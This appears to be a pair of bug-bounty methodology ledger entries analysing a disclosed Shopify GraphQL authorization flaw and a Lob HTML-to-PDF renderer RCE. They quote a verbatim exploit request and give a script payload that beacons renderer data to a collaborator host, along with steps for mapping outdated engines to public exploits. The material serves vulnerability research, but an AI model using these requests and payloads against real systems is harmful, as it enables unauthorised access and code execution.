SOURCE: https://hackerone.com/reports/980511  2026-11-08
ROUTE: full reporter body read live this pass on the `.json` route -> HTTP 200, 9,200 B, `vulnerability_information` 1,780 B read IN FULL; `visibility: full`. Cross-confirmed byte-identically from the LOCAL disclosed-reports mirror `/tmp/h1_test.parquet` row 54 (`/usr/bin/python3.12` + pyarrow 26.0.1; the default `python3` has no pyarrow). Metadata: Shopify, "A staff member with no permissions can edit Store Customer Email", weakness Insecure Direct Object Reference (IDOR) (id 55), severity medium (author_type Team), bounty true, reporter `ash_nz`, submitted 2020-09-12 / disclosed 2020-10-22, 55 votes, state Closed, scope `your-store.myshopify.com` (max_severity critical).
STATUS: UNVERIFIED (not reproduced — no Shopify store pair this pass; the mutation is quoted verbatim from the report)
CLASS: broken access control / missing function-level authorization on a TENANT-CONFIGURATION WRITE — an UNDOCUMENTED internal admin GraphQL mutation (`emailSenderConfigurationUpdate`) accepts a store-level SETTING from a staff seat that holds NO permissions at all, and the input carries NO object identifier, so there is nothing for an ownership check to compare (CWE-862/CWE-863).
CORE METHOD (the report's own steps and the verbatim request):
  1. PRECONDITION — the primitive is a seat with NOTHING granted. Verbatim: "To reproduce this finding you will need two accounts in your store. One is the Owner and the other is an account that you invite as a staff member with no permissions."
  2. ENTRY POINT — verbatim: "`emailSenderConfigurationUpdate` is an undocumented GraphQL API that will allows a malicious staff member in a store to update the `Customer Email`. This email configuration can be found in the general settings in your store."
  3. THE EXACT REQUEST (verbatim, sent from the staff session) — `POST /admin/internal/web/graphql/core HTTP/1.1`, `Cookie: [REDACTED]`, `accept: application/json`, `X-CSRF-Token: [REDACTED]`, `Content-Type: application/json`, `Host: [YOUR-DOMAIN].myshopify.com`, `Accept-Encoding: gzip, deflate`, `Connection: close`, `Content-Length: 346`, body `{"query":"\r\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\r\n    emailSenderConfiguration{\r\n        id\r\n    }\r\n\r\nuserErrors {\r\n    field\r\n    message\r\n}\r\n}\r\n}","variables":{"input":{"senderEmail":"███"}}}` — the ONLY argument is a string VALUE (`senderEmail`); the target store comes from the SESSION, not from any id.
  4. CONFIRM AS THE OWNER — verbatim: "Login with the Owner account and check the `Store details`, the `Customer email` should be updated with the new email address."
  5. The success oracle is the PAYLOAD SHAPE, not the status: the mutation returns `emailSenderConfiguration{id}` with an EMPTY `userErrors` and NO `ACCESS_DENIED`/`requiredAccess` — i.e. nothing denied it (contrast the sibling `shopOwnedAppCreate` of #1555502, which answers `ACCESS_DENIED` + `requiredAccess` when the grant is missing).
DETECTION SIGNAL: an internal, contract-less GraphQL route (`/admin/internal/web/graphql/core`, `/internal/graphql`) whose MUTATIONS take a plain VALUE instead of an id — `*ConfigurationUpdate` / `*SettingUpdate` / `*SenderUpdate` whose input is a raw string (`senderEmail`, a display name, a domain, a reply-to/support address, a webhook URL, a brand name); a ZERO-permission staff seat whose UI never renders that setting; a mutation that answers with a `userErrors` ARRAY rather than an authorization error. CompANION TELL: the mutation name appears in the admin JS bundles but in no public API schema, and the setting it writes is TENANT-WIDE (one row), so there is no victim object to name.
CHAIN: an invited staff member with NO permissions (primitive: a seat that can do nothing in the UI) → the undocumented internal mutation `emailSenderConfigurationUpdate` is replayed on `/admin/internal/web/graphql/core` and writes the tenant-level `Customer Email` (primitive: function-level authorization entirely absent on a settings write whose input carries no identifier — the caller's role is never consulted) → the STORE's outbound customer email address becomes attacker-chosen (escalation: an outbound-communication hijack at the merchant's expense — a rogue staffer impersonates the store to its customers, and per the report's own framing alters "the email that the store customers will see when emailing them", so customer replies flow to the attacker's address) → triage Medium (Team-rated; bounty flag true, amount not published). A P4-looking "a staff seat can flip a setting" raised to a customer-facing communication-integrity impact.
TRANSFERABLE TEST: with TWO sessions (owner + a staff member granted NOTHING), harvest the internal admin GraphQL mutations from the admin JS bundle and send each from the zero-permission session with a benign value; a 200 whose payload is `data` + `userErrors: []` (rather than `ACCESS_DENIED`/`requiredAccess`) means the resolver ran with no permission predicate. AIM FIRST at VALUE-typed mutations: every mutation whose input is a RAW STRING (sender email, reply-to, webhook URL, domain, brand/support name) is a tenant-configuration write that names no object and therefore usually has no ownership check to fail. Rule: **an internal mutation whose input is a VALUE, not an OBJECT id, has no object to authorize — replay it from a seat with no permissions and read `userErrors`, never the status code.**
DEDUPE: 0 hits across all three write targets for `980511`, `emailSenderConfigurationUpdate`, `senderEmail`, `Customer Email`/`customer email` (case-insensitive), `zero permission`. Related-but-recorded material REVIEWED and NOT re-recorded as this method: the ledger's OTHER `/admin/internal/web/graphql/core` entries each key a DIFFERENT authorization-failure mode — §17.198 (`fileCopy`) is a RAW STORAGE KEY (`absoluteKey`/`key`/`path`) whose owner is derived from CALLER INPUT, replayed cross-tenant after minting a valid key in a second tenant you own; the batch-85 slot on `shopOwnedAppCreate` (#1555502) is the GRANULAR permission-predicate leak (a coarse gate satisfied by ONE object-level app grant, and it ANSWERS `ACCESS_DENIED` while the grant is absent); #1010835 is the ERROR-VOCABULARY ORACLE used as the INSTRUMENT. None records a mutation that names NO identifier at all — a plain tenant SETTING written by a seat with ZERO permissions, where the defect is the total ABSENCE of a function-level check rather than a comparison that got the ownership wrong. New general method -> §17.297.

PARTIAL SOURCING — no request shape, engine build or exploit id is published; NOTHING was invented to fill the gap.
STATUS: UNVERIFIED (not reproduced) — nothing was executed and no Lob endpoint was touched; the two sentences below are quoted verbatim from the credited author's abstract.
CLASS: RCE by escalating an HTML-PREVIEW primitive — a server-side HTML→PDF renderer that EXECUTES JAVASCRIPT and is built on an OUTDATED third-party engine, so script execution inside the document is not a sandbox but the delivery step of a public memory-corruption exploit (WebKit use-after-free; triaged Critical 9.8).
CORE METHOD (the credited author's abstract, quoted verbatim — the report body itself is withheld):
  1. ENTRY POINT + PRIMITIVE, verbatim: "The Template Preview function allows users to render arbitrary HTML to a PDF document, this includes the ability to execute arbitrary Javascript." — the app's OWN preview feature accepts attacker HTML and RUNS its JavaScript server-side (the P4-looking "I can preview my template" primitive).
  2. THE ESCALATION PREMISE, verbatim: "The HTML agent used to render the HTML is based on an old version of WebKit which has known security issues, for which public exploits and Proof of Concepts (PoCs) are available." — the engine is not merely JS-capable, it is a KNOWN-VULNERABLE engine VERSION, and public PoCs for it are the escalation.
  3. FOLD THE TWO: JS execution in the document (step 1) is the DELIVERY, the outdated WebKit build is the SINK, and a public exploit for that build is the code-execution step. The vulnerability TYPE recorded for this report by the third-party index is literally "Use After Free" — i.e. a memory-corruption class reachable from the script execution in step 1.
  4. Impact as triaged: RCE on the rendering host (Critical, CVSS 9.8, $1,500, 68 upvotes).
DETECTION SIGNAL: any "template / document / invoice / report PREVIEW" that renders user HTML to a PDF or image SERVER-side. Signal 1 = your `<script>` FIRES (a collaborator hit carrying the RENDERER's UA, not your browser's). Signal 2 = the engine's IDENTITY and VERSION — read the produced artifact's producer/metadata AND the renderer's own `navigator.userAgent` (reachable from step 1's JS) and compare that BUILD against the public CVE/PoC list for that engine. A JS-capable renderer whose build is years behind upstream is the finding. CONTRAST TELL: a renderer that executes JS but is CURRENTLY patched still yields only the recorded SSRF class — the ESCALATION needs the VERSION GAP, so fingerprint before you escalate.
CHAIN: any user who can author a template/HTML body, or any field that lands in the rendered document (primitive: a normal authoring action) → the Template Preview renders it to PDF server-side AND executes its JavaScript (primitive: the renderer is a real JS engine, not a static HTML→PDF library) → attacker script runs inside an engine built on an OLD WebKit for which public UAF exploits/PoCs exist (primitive: unpatched engine version ⇒ an off-the-shelf memory-corruption primitive) → code execution on the render host = RCE (impact; triaged Critical 9.8, $1,500). A P4 "HTML preview executes my script" chained to a P1.
TRANSFERABLE TEST: on every HTML/markup → PDF/image preview or export, submit `<script>new Image().src='http://<collab>/x-'+navigator.userAgent</script>`; a collaborator hit whose UA is the RENDERER's (and whose path carries that engine string) PROVES server-side JS execution — record the exact engine + version. Then (a) read the same version out of the returned PDF's producer metadata, (b) look the build up in the public exploit/PoC corpus for WebKit/Chromium/wkhtmltopdf, and (c) if the build is unpatched, treat the preview as an RCE entry point, not an SSRF one. Rule: **inside a server-side HTML→PDF preview, "my <script> fired" is only the primitive — the finding is the ENGINE VERSION behind it: fingerprint it (UA + PDF producer) and map the build to a public memory-corruption PoC.**
DEDUPE: 0 hits across all three write targets for `520717`, `Template Preview`, `HTML agent`, `Lob`. Related-but-recorded material REVIEWED and NOT re-recorded as this method: ledger §17.130 (#1628209, DoD FAST) and the `print-to-pdf` transform entry are "HTML injection into a PDF/headless renderer → SSRF → AWS credentials rendered back into the artifact" — the renderer-EXECUTES-JS half IS recorded there, but its escalation goes to the METADATA SERVICE and needs the fetched value reflected into the output; the playbook's V-06 records the renderer as an SSRF sink (`<img>`/CSS `url()`/`<image href>`) with an exfiltration channel; the Basecamp entry (#2107680, outdated `librsvg` uninitialized-memory bug, High 8.6) is an OUTDATED-DEPENDENCY defect but its primitive is CRAFTED MEDIA (SVG rasterisation) and its impact is an information leak, not script execution → host RCE; the recorded "Kibana `--no-sandbox` Chromium RCE" needs a MISCONFIGURED launch flag, whereas this needs only a VERSION GAP; the client-side "sandbox escape"/browser hits are unrelated. No recorded entry chains a server-side HTML→PDF preview's JS execution to HOST RCE through a public exploit for the renderer's outdated engine version. New general method -> §17.298.
